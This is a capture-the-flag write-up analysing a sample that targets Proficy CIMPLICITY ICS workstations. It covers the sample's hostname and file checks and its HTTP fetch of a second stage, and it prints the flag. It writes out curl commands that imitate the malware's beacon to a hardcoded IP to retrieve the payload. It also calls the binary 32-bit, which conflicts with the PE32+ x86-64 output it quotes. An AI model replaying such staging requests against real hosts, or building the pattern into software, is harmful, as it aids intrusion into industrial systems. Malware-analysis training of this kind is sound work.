# Shai-Hulud | Hard (600 points)

Hi Analyst,

During a routine security audit, we were notified of an unusual file on one of our ICS workstations which was thought to be airgapped. We believe the binary is gathering information in preparation to move to a second stage.

Unfortunately, we have not been able to progress further. Can you investigate how the file is communicating and see if you can retrieve the second stage?

Good Luck

password: `infected`

-----

Within the 7-zip, we are given the binary - `cimplserver.sample` - a 32-bit Windows PE:

```
$ file cimplserver.sample
cimplserver.sample: PE32+ executable (console) x86-64, for MS Windows
```

Carrying out some basic static analysis, we see from `strings` output there is an IP address, file paths for Proficy CIMPLICITY software, possible second-stage information, and potential HTTP request functionality:

```
13.60.135.243
C:\Program Files (x86)\Proficy\Proficy CIMPLICITY
C:\Program Files\Proficy\Proficy CIMPLICITY
HMI-CTRL
Stage2: GreenWillow.iso
Arrakis/0.2
...
WinHttpConnect
WinHttpSendRequest
WinHttpCloseHandle
WinHttpOpenRequest
WinHttpQueryHeaders
WinHttpAddRequestHeaders
WinHttpOpen
WinHttpReceiveResponse
WINHTTP.dll
```

Opening this in Ghidra/IDA, we can see the functionality clearer.

Initially, the binary checks the hostname for the system matches `HMI-CTRL` - likely an engineering workstation for a Human Machine Interface:

![](/images/shaihulud_hostname_check.png)

If this passes, the binary then checks the existence of Proficy software by checking two file paths (1) before attempting to retrieve the second stage (2), passing in the IP address and port:

![](/images/shaihulud_file_check.png)

Navigating to the website shows Dune ASCII art with a random quote from the books:

![](/images/shaihulud_website.png)

The second stage is retrieved using a custom user-agent string (1) via a HTTP GET request (2) to the IP. Custom headers are also added (3) before sending the request (4):

![](/images/shaihulud_stage2.png)

Replicating the same request with the user-agent and header to the IP, we get a valid response:

```
curl -L -A "Arrakis/0.2" -H "Stage2: GreenWillow.iso" http://13.60.135.243
```

![](/images/shaihulud_testing_curl.png)

Adding the `v` flag for verbosity shows the flag in the response:

```
curl -vL -A "Arrakis/0.2" -H "Stage2: GreenWillow.iso" http://13.60.135.243
```

![](/images/shaihulud_flag.png)

```
flag{gru_74455_b4ck_4t_1t_aga1n_37a6d}
```